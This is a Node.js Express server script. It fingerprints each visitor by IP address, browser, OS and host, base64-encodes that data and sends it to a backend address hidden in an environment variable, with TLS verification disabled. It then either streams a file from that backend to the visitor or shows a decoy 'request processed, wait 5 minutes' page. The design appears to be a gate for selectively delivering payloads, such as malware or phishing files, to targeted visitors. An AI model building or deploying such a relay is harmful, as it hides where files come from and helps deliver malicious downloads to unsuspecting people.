import express from "express";
import dotenv from "dotenv";
import https from "https";
import useragent from "express-useragent";

const app = express();
dotenv.config();
app.use(useragent.express());

app.get("/", function (req, res) {
  res.status(400);
  res.send("Bad Request: Invalid data.");
});

app.get("/:encstring/:case", function (req, res) {
  const ipAddress = req.header("x-forwarded-for") || req.socket.remoteAddress;
  const RequestUrl = req.originalUrl;
  const RUrl = process.env.R_URL;
  var userAgent = Object.entries(req.useragent);
  var userInfo = "{";
  var comma = "";
  const generateString = () => {
    const length = 20;
    const characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = " ";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  };
  userAgent.map(([key, value]) => {
    if (value != false) {
      if (
        key == "browser" ||
        key == "os" ||
        key == "version" ||
        key == "platform"
      ) {
        userInfo += comma + '"' + key + '":"' + value + '"';
        comma = ", ";
      }
    }
  });
  userInfo += ',"Host":"' + req.hostname + '"';
  userInfo += "}";
  const encodedBuffer = Buffer.from(userInfo, "utf-8");
  const B64encodedString = encodedBuffer.toString("base64");

  const encodeBuffIP = Buffer.from(ipAddress, "utf-8");
  const IPB64encodedString = encodeBuffIP.toString("base64");

  const url =
    RUrl + RequestUrl + "/" + IPB64encodedString + "/" + B64encodedString;

  const options = {
    rejectUnauthorized: false,
  };
  console.log("Request : ", url);
  https.get(url, options, function (file) {
    if (
      file.headers["content-length"] > 10 ||
      typeof file.headers["mickymouse"] !== "undefined"
    ) {
      const ContentType = file.headers["content-type"];
      const Filename = file.headers["content-disposition"];
      console.log("Downloading File ", Filename);
      res.set("Content-disposition", Filename);
      res.set("Content-Type", ContentType);
      if (typeof file.headers["mickymouse"] !== "undefined") {
        res.set("mickymouse", file.headers["mickymouse"]);
      }
      res.set("Content-file", file.headers["content-file"]);
      res.set("Content-Length", file.headers["content-length"]);
      file.pipe(res);
    } else {
      res.status(200);
      res.type("html");
      res.send(
        "<div style='text-align:center; margin-top:12rem;'>Your request number : <b>" +
          generateString() +
          "</b> has been processed.<br><br> Please <b style='color:red'>wait for 5 minutes</b> to process again.</div>"
      );
    }
  });
});
const DEFAULT_PORT = 3001;
const port = process.env.PORT || DEFAULT_PORT;
app.listen(port, () => {
  console.log(`Running on ${port}`);
});
